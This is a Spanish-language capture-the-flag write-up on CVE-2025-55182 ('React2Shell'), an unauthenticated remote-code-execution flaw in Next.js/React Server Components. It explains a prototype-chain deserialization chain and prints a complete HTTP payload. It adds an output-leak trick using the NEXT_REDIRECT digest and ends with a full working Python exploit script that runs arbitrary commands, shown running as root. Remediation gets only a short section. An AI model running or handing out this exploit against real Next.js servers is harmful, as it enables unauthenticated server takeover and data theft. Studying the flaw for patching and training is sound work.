# Writeup: web_reactoops (React2Shell — CVE-2025-55182)

**Categoría:** Web **Dificultad:** Media **Vulnerabilidad:** RCE no autenticada en React Server Components / Next.js

---

## 1. Reconocimiento

El código fuente entregado es una app Next.js estándar (landing page "NexusAI") sin ningún input de usuario visible ni endpoints custom. La pista está en `package.json`:

```json
"next": "16.0.6",
"react": "^19"
```

Next.js 16.0.6 es una versión **vulnerable por defecto**, incluso sin código propio, a **CVE-2025-55182**, apodada **"React2Shell"** (CVSS 10.0, RCE no autenticada).

## 2. La vulnerabilidad

React Server Components (RSC) usan un protocolo de serialización llamado **Flight** para comunicar cliente y servidor. Cuando el navegador invoca una Server Action, envía un `POST` `multipart/form-data` con el header `Next-Action`, y el servidor deserializa ese cuerpo para reconstruir los argumentos de la función.

El bug está en el deserializador (`ReactFlightReplyServer.js`): **no valida la estructura del objeto antes de tratarlo como un "Chunk" interno**. Esto permite al atacante enviar un JSON que se hace pasar por un Chunk legítimo y encadenar tres pasos hasta lograr ejecución de código:

1. **Fake thenable (secuestro de `then`)** Se envía un objeto con `"then": "$1:__proto__:then"` y `"status": "resolved_model"`. La sintaxis `$1:__proto__:then` es una referencia del propio protocolo Flight que recorre la cadena de prototipos hasta encontrar `Chunk.prototype.then`. Al marcar el chunk como "ya resuelto", React llama a ese `then` pasándole el objeto controlado por el atacante como `this`.
    
2. **Acceso al constructor `Function`** Ese `then` internamente llama a métodos que usan `chunk._response`, un objeto que en nuestro payload es completamente nuestro. Dentro de él ponemos:
    
    ```json
    "_formData": { "get": "$1:constructor:constructor" }
    ```
    
    `$1:constructor:constructor` es otra referencia de prototipos que resuelve al constructor `Function` de JavaScript.
    
3. **Ejecución de código arbitrario** El flujo de deserialización de "Blob" del protocolo llama a `response._formData.get(response._prefix + id)` y **ejecuta el resultado como función**. Como `_formData.get` ya apunta a `Function`, y `_prefix` contiene nuestro código JS, el servidor termina ejecutando `Function("<nuestro_código>")()` — RCE completo, sin autenticación, con una sola petición HTTP.
    

### Payload final

```
POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data; boundary=...

------boundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,
 "value":"{\"then\":\"$B1337\"}",
 "_response":{
   "_prefix":"process.mainModule.require('child_process').execSync('id');",
   "_formData":{"get":"$1:constructor:constructor"}
 }}
------boundary
Content-Disposition: form-data; name="1"

"$@0"
------boundary--
```

El campo `"1"` con valor literal `"$@0"` es una referencia circular: le dice al parser "el chunk raíz de los argumentos es el mismo objeto que definí en el campo 0", cerrando el ciclo que dispara todo el proceso.

### Filtrando la salida del comando

Como no hay una respuesta directa visible, se abusa del mecanismo interno de redirecciones de Next.js (`NEXT_REDIRECT`). En vez de ejecutar el comando "a secas", se lanza un error cuyo `digest` sigue el formato que Next.js usa para redirects:

```js
var res = process.mainModule.require('child_process')
            .execSync(CMD).toString().trim();
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/leak?a=${encodeURIComponent(res)};307;`
});
```

Next.js interpreta ese `digest` como una redirección legítima y la refleja en el header de respuesta `x-action-redirect`, filtrando así la salida del comando sin necesidad de un listener/callback externo.

## 3. Explotación

Script (`exploit.py`), uso:

```bash
pip install requests
python3 exploit.py http://<IP>:<PUERTO> "id"
python3 exploit.py http://<IP>:<PUERTO> "cat /app/flag.txt"
```

Resultado contra el target:

```
[*] Status: 303
[+] Command output:
uid=0(root) gid=0(root) groups=0(root)
```

Confirmando ejecución de comandos como **root** dentro del contenedor. Repitiendo con `cat /app/flag.txt` se obtiene la flag (ruta fijada por el `Dockerfile` del reto, que copia `flag.txt` a `/app/flag.txt` antes de arrancar el server).

## 4. Causa raíz y remediación

- **Causa raíz:** deserialización insegura de datos no confiables (CWE-502) en el protocolo Flight de RSC — el parser resuelve referencias de tipo `$path:a:b` sin restringir el acceso a propiedades peligrosas como `__proto__` o `constructor`.
- **Fix oficial:** actualizar a Next.js `>=16.0.7` / `15.x` parcheado, y React `>=19.0.1` / `19.1.2` / `19.2.1`. El parche valida las rutas de propiedades permitidas antes de resolver referencias en el payload.

## 5. Exploir

```python
import requests
import json
import sys
import re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337"
CMD = sys.argv[2] if len(sys.argv) > 2 else "id"

# Leak command output back in the response by abusing Next.js' NEXT_REDIRECT
# digest convention: whatever we put after NEXT_REDIRECT;push;<path>;307; gets
# reflected back to us in the error digest of the 500 response.
js_snippet = (
    "var res=process.mainModule.require('child_process').execSync(%s)"
    ".toString().trim();"
    "throw Object.assign(new Error('NEXT_REDIRECT'),"
    "{digest:`NEXT_REDIRECT;push;/leak?a=${encodeURIComponent(res)};307;`});"
) % json.dumps(CMD)

payload_obj = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": json.dumps({"then": "$B1337"}),
    "_response": {
        "_prefix": js_snippet,
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}

payload_str = json.dumps(payload_obj)

# NOTE: field "1" must be the *JSON string* "$@0" (i.e. literally the four
# characters $@0 wrapped in double quotes) -- not the bare text $@0.
files = {
    "0": (None, payload_str),
    "1": (None, '"$@0"'),
    "2": (None, "[]"),
}

headers = {
    "Next-Action": "x",
    "Accept": "text/x-component",
}

r = requests.post(TARGET, headers=headers, files=files, allow_redirects=False)
print("[*] Status:", r.status_code)

leak_header = r.headers.get("x-action-redirect", "")
m = re.search(r"a=([^;&]+)", leak_header)
if m:
    from urllib.parse import unquote
    print("\n[+] Command output:")
    print(unquote(m.group(1)))
else:
    print("[!] No leak found. Headers were:")
    for k, v in r.headers.items():
        print(f"  {k}: {v}")
    print("\nBody:")
    print(r.text[:2000])

```